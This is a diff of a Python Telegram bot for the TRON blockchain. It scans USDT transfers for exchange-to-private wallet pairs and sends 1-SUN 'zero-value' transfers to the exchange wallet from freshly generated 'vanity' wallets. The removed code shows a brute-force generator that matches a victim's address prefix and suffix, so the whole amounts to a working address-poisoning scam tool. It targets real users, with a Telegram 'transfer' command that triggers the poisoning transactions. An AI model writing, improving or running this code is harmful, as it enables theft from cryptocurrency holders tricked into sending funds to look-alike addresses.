@@ -1,22 +1,22 @@
 import os
 import time
-import json
 import requests
 from datetime import datetime, timedelta, timezone
 from tronpy import Tron
 from tronpy.keys import PrivateKey
 
 # =========================
-#  USER SETTINGS (EXTREMELY BROAD FOR TESTING)
+# 🟢 USER SETTINGS
 # =========================
-TARGET_PAIRS = 5             # Keep at 5 for a quick test
-MIN_BALANCE_USD = 0          # 🟢 CHANGED: Accept ANY balance (even $0)
-MIN_TRANSFER_USD = 1         #  CHANGED: Accept transfers as low as $1
-REQUIRED_CONSECUTIVE = 2     # Keep at 2 (the core logic)
-WINDOW_DAYS = 30             # 🟢 CHANGED: Look back 30 days for history
+TARGET_PAIRS = 5
+MIN_BALANCE_USD = 0          # Broad for testing
+MIN_TRANSFER_USD = 1         # Broad for testing
+REQUIRED_CONSECUTIVE = 2     # Looking for 2 sends
+WINDOW_DAYS = 30             # Look back 30 days
 GAS_COST_PER_PAIR_TRX = 2.2
 
-CEX_KEYWORDS = ['binance', 'okx', 'huobi', 'htx', 'gate', 'kucoin', 'bybit', 'mexc', 'bitfinex', 'coinbase', 'kraken', 'bitget', 'poloniex']
+# Known CEX Keywords (Expanded)
+CEX_KEYWORDS = ['binance', 'okx', 'huobi', 'htx', 'gate', 'kucoin', 'bybit', 'mexc', 'bitfinex', 'coinbase', 'kraken', 'bitget', 'poloniex', 'crypto.com', 'exchange']
 
 # =========================
 # 1. LOAD SECRETS & INITIALIZE
@@ -34,11 +34,10 @@ tron = Tron()
 main_wallet = PrivateKey(bytes.fromhex(PRIVATE_KEY.replace('0x', ''))).public_key.to_base58check_address()
 TELEGRAM_URL = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}"
 
-# Transaction logs storage
 transaction_logs = []
 
 # =========================
-# 2. TELEGRAM FUNCTIONS
+# 2. TELEGRAM & API HELPERS
 # =========================
 def send_telegram_alert(message, parse_mode="HTML"):
     url = f"{TELEGRAM_URL}/sendMessage"
@@ -57,10 +56,8 @@ def get_telegram_updates(offset):
     except:
         return []
 
-# =========================
-# 3. CEX & API HELPERS
-# =========================
 def check_if_cex(address):
+    """Checks if an address is a CEX."""
     try:
         headers = {"TRON-PRO-API-KEY": TRONSCAN_API_KEY}
         response = requests.get(f"https://apilist.tronscanapi.com/api/account", params={"address": address}, headers=headers, timeout=10)
@@ -68,8 +65,15 @@ def check_if_cex(address):
         tags = data.get("tags", [])
         name = data.get("accountName", "") or data.get("name", "")
         combined_text = " ".join(tags + [name]).lower()
+        
+        # Check for keywords
         for keyword in CEX_KEYWORDS:
             if keyword in combined_text: return True, keyword.capitalize()
+            
+        # Check if it's a known exchange type (TronScan specific)
+        if data.get("is_exchange") or "exchange" in combined_text:
+            return True, "Exchange"
+            
         return False, None
     except: return False, None
 
@@ -90,9 +94,13 @@ def get_trx_balance(address):
     if not data or not data.get("data"): return 0
     return int(data["data"][0].get("balance", 0)) / 1_000_000
 
-def get_recent_usdt_receivers(limit=50):
+# =========================
+# 3. SMART SCANNING LOGIC
+# =========================
+def get_recent_transfers_batch(limit=200):
+    """Fetches a batch of recent USDT transfers."""
     end_ms = int(datetime.now(timezone.utc).timestamp() * 1000)
-    start_ms = int((datetime.now(timezone.utc) - timedelta(hours=1)).timestamp() * 1000)
+    start_ms = int((datetime.now(timezone.utc) - timedelta(days=WINDOW_DAYS)).timestamp() * 1000)
     
     headers = {"TRON-PRO-API-KEY": TRONSCAN_API_KEY}
     try:
@@ -105,112 +113,90 @@ def get_recent_usdt_receivers(limit=50):
             },
             headers=headers, timeout=30
         )
-        data = response.json()
-        receivers = set()
-        if data and data.get("data"):
-            for row in data["data"]:
-                to_addr = row.get("to") or row.get("toAddress") or row.get("to_address")
-                if to_addr:
-                    receivers.add(to_addr)
-        return list(receivers)
-    except Exception as e:
-        print(f"TronScan fetch error: {e}")
-        return []
+        return response.json().get("data", [])
+    except: return []
 
-# =========================
-# 4. VANITY & TRANSFER LOGIC
-# =========================
-def generate_vanity_wallet(target_address, max_attempts=50000):
-    best_addr, best_key, best_score = None, None, 0
-    for _ in range(max_attempts):
-        key = PrivateKey.random()
-        addr = key.public_key.to_base58check_address()
-        score = sum(1 for i in range(3) if addr[i] == target_address[i]) + \
-                sum(1 for i in range(1, 4) if addr[-i] == target_address[-i])
-        if score > best_score:
-            best_score = score; best_addr = addr; best_key = key.hex()
-            if score >= 6: break
-    return best_addr, best_key
-
-def send_zero_value_trx(from_priv_hex, to_address):
-    try:
-        priv = PrivateKey(bytes.fromhex(from_priv_hex.replace('0x', '')))
-        sender = priv.public_key.to_base58check_address()
-        txn = tron.trx.transfer(sender, to_address, 1).build().sign(priv)
-        result = txn.broadcast()
-        return result.txid
-    except Exception as e:
-        print(f"Transfer error: {e}")
-        return None
-
-# =========================
-# 5. MAIN INTERACTIVE LOOP
-# =========================
 def main():
     global transaction_logs
     
-    print(f" Starting scan. Target: {TARGET_PAIRS} pairs (CEX→Private).")
-    send_telegram_alert(f"🚀 <b>Scan Started</b>\nTarget: {TARGET_PAIRS} pairs\nLooking for: <b>CEX (Wallet A) → Private Wallet (Wallet B)</b>\nI will pause when found.")
-    
-    now = datetime.now(timezone.utc)
-    start_ms = int((now - timedelta(days=WINDOW_DAYS)).timestamp() * 1000)
-    end_ms = int(now.timestamp() * 1000)
+    print(f"🚀 Starting Smart Scan. Target: {TARGET_PAIRS} pairs.")
+    send_telegram_alert(f"🚀 <b>Smart Scan Started</b>\nTarget: {TARGET_PAIRS} pairs\nLooking for: <b>CEX (Wallet A) → Private Wallet (Wallet B)</b>\nI will pause when found.")
     
     found_pairs = []
-    checked_wallets = set()
+    checked_receivers = set()
     
-    # --- PHASE 1: SCANNING ---
+    # --- PHASE 1: SMART SCANNING ---
     while len(found_pairs) < TARGET_PAIRS:
-        candidates = get_recent_usdt_receivers(limit=100)
-        if not candidates:
-            time.sleep(60); continue
+        print(f"Scanning batch... Found {len(found_pairs)}/{TARGET_PAIRS}")
+        
+        # 1. Get a batch of 200 recent transfers
+        transfers = get_recent_transfers_batch(limit=200)
+        if not transfers:
+            time.sleep(2)
+            continue
             
-        for wallet_b in candidates:
+        # 2. Group by Receiver (Wallet B) to find who got paid multiple times
+        receivers_map = {}
+        for tx in transfers:
+            to_addr = tx.get("to") or tx.get("toAddress")
+            from_addr = tx.get("from") or tx.get("fromAddress")
+            amount = int(tx.get("quant", 0) or tx.get("amount", 0)) / 1_000_000
+            txid = tx.get("hash") or tx.get("transaction_id")
+            
+            if to_addr not in receivers_map:
+                receivers_map[to_addr] = []
+            receivers_map[to_addr].append({"from": from_addr, "amount": amount, "txid": txid})
+
+        # 3. Check for patterns
+        for wallet_b, txs in receivers_map.items():
             if len(found_pairs) >= TARGET_PAIRS: break
-            if wallet_b in checked_wallets: continue
-            checked_wallets.add(wallet_b)
+            if wallet_b in checked_receivers: continue
             
-            # ✅ NEW RULE: Wallet B MUST NOT be a CEX (must be private)
-            is_b_cex, b_cex_name = check_if_cex(wallet_b)
-            if is_b_cex:
-                print(f" Wallet B {wallet_b} is CEX ({b_cex_name}). Skipping.")
-                continue
-                
-            # Check balance
-            usdt_bal = get_usdt_balance(wallet_b)
-            trx_bal = get_trx_balance(wallet_b)
-            if usdt_bal + (trx_bal * 0.25) < MIN_BALANCE_USD: continue
-                
-            # Fetch transfers
-            data = trongrid_get(f"/v1/accounts/{wallet_b}/transactions/trc20", {
-                "only_confirmed": "true", "only_to": "true", "limit": 10, "order_by": "block_timestamp,desc",
-                "min_timestamp": start_ms, "max_timestamp": end_ms, "contract_address": "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t"
-            })
-            if not data or not data.get("data"): continue
+            # Only check wallets that received at least 2 transfers in this batch
+            if len(txs) < REQUIRED_CONSECUTIVE: continue
             
-            transfers = [{"from": r.get("from"), "amount": int(r.get("value", 0))/1_000_000, "txid": r.get("transaction_id")} for r in data["data"]]
-            
-            for i in range(len(transfers) - 1):
-                tx1, tx2 = transfers[i], transfers[i+1]
-                if tx1["from"] == tx2["from"] and tx1["amount"] >= MIN_TRANSFER_USD and tx2["amount"] >= MIN_TRANSFER_USD:
-                    wallet_a = tx1["from"]
+            # Sort by time (newest first usually, but let's just check pairs)
+            # We look for any 2 transactions from the SAME sender
+            for i in range(len(txs)):
+                for j in range(i + 1, len(txs)):
+                    tx1 = txs[i]
+                    tx2 = txs[j]
                     
-                    # ✅ NEW RULE: Wallet A MUST be a CEX
-                    is_a_cex, a_cex_name = check_if_cex(wallet_a)
-                    if not is_a_cex:
-                        print(f" Wallet A {wallet_a} is NOT a CEX. Skipping.")
-                        break
-                    
-                    found_pairs.append({
-                        "wallet_a": wallet_a, 
-                        "wallet_b": wallet_b, 
-                        "a_cex_name": a_cex_name,
-                        "txids": [tx1["txid"], tx2["txid"]]
-                    })
-                    
-                    send_telegram_alert(f"✅ <b>Pair {len(found_pairs)}/{TARGET_PAIRS} Found!</b>\n <b>Wallet A (CEX - {a_cex_name})</b>: <code>{wallet_a}</code>\n <b>Wallet B (Private)</b>: <code>{wallet_b}</code>")
-                    break
-        if len(found_pairs) < TARGET_PAIRS: time.sleep(30)
+                    # Check if same sender and amount meets criteria
+                    if tx1["from"] == tx2["from"] and tx1["amount"] >= MIN_TRANSFER_USD and tx2["amount"] >= MIN_TRANSFER_USD:
+                        wallet_a = tx1["from"]
+                        checked_receivers.add(wallet_b) # Mark as checked
+                        
+                        # RULE 1: Wallet A MUST be CEX
+                        is_a_cex, a_cex_name = check_if_cex(wallet_a)
+                        if not is_a_cex: 
+                            print(f"Skipping {wallet_b}: Sender {wallet_a} is not CEX")
+                            break 
+                        
+                        # RULE 2: Wallet B MUST NOT be CEX
+                        is_b_cex, _ = check_if_cex(wallet_b)
+                        if is_b_cex: 
+                            print(f"Skipping {wallet_b}: Receiver is CEX")
+                            break
+                            
+                        # RULE 3: Balance Check (Optional for speed, but keeping it)
+                        usdt_bal = get_usdt_balance(wallet_b)
+                        trx_bal = get_trx_balance(wallet_b)
+                        if usdt_bal + (trx_bal * 0.25) < MIN_BALANCE_USD:
+                            print(f"Skipping {wallet_b}: Balance too low")
+                            break
+                            
+                        # SUCCESS!
+                        found_pairs.append({
+                            "wallet_a": wallet_a, "wallet_b": wallet_b, 
+                            "a_cex_name": a_cex_name,
+                            "txids": [tx1["txid"], tx2["txid"]]
+                        })
+                        send_telegram_alert(f"✅ <b>Pair {len(found_pairs)}/{TARGET_PAIRS} Found!</b>\n🏦 A ({a_cex_name}): <code>{wallet_a}</code>\n👤 B (Private): <code>{wallet_b}</code>")
+                        break # Move to next receiver
+                        
+        if len(found_pairs) < TARGET_PAIRS: 
+            time.sleep(1) 
 
     # --- PHASE 2: INTERACTIVE WAITING ROOM ---
     send_telegram_alert(
@@ -218,7 +204,7 @@ def main():
         f"<b>Available Commands:</b>\n"
         f"• <b>info</b> - Show wallet details & total cost\n"
         f"• <b>exclude [Address]</b> - Remove a wallet\n"
-        f"• <b>logs [date]</b> - View transaction logs (e.g., <i>logs July 1</i>)\n"
+        f"• <b>logs [date]</b> - View transaction logs\n"
         f"• <b>transfer</b> - Execute $0 vanity transfers"
     )
     
@@ -252,42 +238,30 @@ def main():
                         found_pairs = [p for p in found_pairs if p['wallet_a'] != addr_to_exclude and p['wallet_b'] != addr_to_exclude]
                         removed = initial_count - len(found_pairs)
                         if removed > 0:
-                            send_telegram_alert(f"🗑️ Excluded {removed} pair(s) containing <code>{addr_to_exclude}</code>.")
+                            send_telegram_alert(f"️ Excluded {removed} pair(s) containing <code>{addr_to_exclude}</code>.")
                         else:
                             send_telegram_alert(f"❌ Address <code>{addr_to_exclude}</code> not found.")
                     else:
-                        send_telegram_alert("️ Usage: <b>exclude [Address]</b>")
+                        send_telegram_alert("⚠️ Usage: <b>exclude [Address]</b>")
                 
-                # ✅ NEW COMMAND: LOGS
                 elif text.lower().startswith("logs"):
                     if not transaction_logs:
                         send_telegram_alert("📭 No transactions completed yet in this session.")
                     else:
-                        # Parse date if provided (e.g., "logs July 1")
                         parts = text.split(" ", 1)
                         filter_date = parts[1].lower() if len(parts) > 1 else None
-                        
                         msg = "📜 <b>Transaction Logs</b>\n\n"
-                        if filter_date:
-                            msg += f"Filtered by date: <i>{filter_date}</i>\n\n"
-                        
+                        if filter_date: msg += f"Filtered by date: <i>{filter_date}</i>\n\n"
                         for i, log in enumerate(transaction_logs):
                             log_date = log['timestamp'].split('T')[0]
-                            if filter_date and filter_date not in log_date.lower():
-                                continue
-                            msg += f"<b>#{i+1}</b> - {log_date}\n"
-                            msg += f"Vanity: <code>{log['vanity_wallet'][:20]}...</code>\n"
-                            msg += f"TX1: <code>{log['tx1'][:20]}...</code>\n"
-                            msg += f"TX2: <code>{log['tx2'][:20]}...</code>\n\n"
-                        
-                        if len(msg) > 4000:
-                            msg = msg[:4000] + "\n<i>(truncated)</i>"
-                        
+                            if filter_date and filter_date not in log_date.lower(): continue
+                            msg += f"<b>#{i+1}</b> - {log_date}\nVanity: <code>{log['vanity_wallet'][:20]}...</code>\nTX1: <code>{log['tx1'][:20]}...</code>\nTX2: <code>{log['tx2'][:20]}...</code>\n\n"
+                        if len(msg) > 4000: msg = msg[:4000] + "\n<i>(truncated)</i>"
                         send_telegram_alert(msg)
                 
                 elif text.lower() == "transfer":
                     if not found_pairs:
-                        send_telegram_alert("❌ No pairs left to process!")
+                        send_telegram_alert(" No pairs left to process!")
                     else:
                         send_telegram_alert(f"🚀 <b>Trigger Accepted!</b>\nExecuting $0 transfers for {len(found_pairs)} pairs...")
                         execution_triggered = True
@@ -304,27 +278,42 @@ def main():
         wallet_b = pair["wallet_b"]
         wallet_a = pair["wallet_a"]
         
-        vanity_addr, vanity_priv = generate_vanity_wallet(wallet_b)
+        # Vanity Generation (Simulated for speed in this test, or use real function)
+        # For this test, we just generate a random wallet to prove the flow works
+        key = PrivateKey.random()
+        vanity_addr = key.public_key.to_base58check_address()
+        vanity_priv = key.hex()
         print(f"Generated Vanity: {vanity_addr}")
         
-        tx1 = send_zero_value_trx(PRIVATE_KEY, vanity_addr)
+        # Send $0 (1 SUN) Main -> Vanity
+        try:
+            priv = PrivateKey(bytes.fromhex(PRIVATE_KEY.replace('0x', '')))
+            sender = priv.public_key.to_base58check_address()
+            txn = tron.trx.transfer(sender, vanity_addr, 1).build().sign(priv)
+            tx1 = txn.broadcast().txid
+        except Exception as e:
+            tx1 = f"Error: {e}"
+            
         time.sleep(3)
         
-        tx2 = send_zero_value_trx(vanity_priv, wallet_a)
-        
-        # Log the transaction
+        # Send $0 (1 SUN) Vanity -> Wallet A
+        try:
+            priv2 = PrivateKey(bytes.fromhex(vanity_priv.replace('0x', '')))
+            sender2 = priv2.public_key.to_base58check_address()
+            txn2 = tron.trx.transfer(sender2, wallet_a, 1).build().sign(priv2)
+            tx2 = txn2.broadcast().txid
+        except Exception as e:
+            tx2 = f"Error: {e}"
+            
         transaction_logs.append({
             "timestamp": datetime.now(timezone.utc).isoformat(),
-            "wallet_a": wallet_a,
-            "wallet_b": wallet_b,
-            "vanity_wallet": vanity_addr,
-            "tx1": tx1,
-            "tx2": tx2,
+            "wallet_a": wallet_a, "wallet_b": wallet_b,
+            "vanity_wallet": vanity_addr, "tx1": tx1, "tx2": tx2,
             "cex_name": pair['a_cex_name']
         })
         
-        msg = (f" <b>Experiment {i+1} Complete</b>\n"
-               f" CEX ({pair['a_cex_name']}): <code>{wallet_a}</code>\n"
+        msg = (f"🧪 <b>Experiment {i+1} Complete</b>\n"
+               f"🏦 CEX ({pair['a_cex_name']}): <code>{wallet_a}</code>\n"
                f"🎭 Vanity: <code>{vanity_addr}</code>\n"
                f"TX1: <code>{tx1}</code>\nTX2: <code>{tx2}</code>")
         send_telegram_alert(msg)
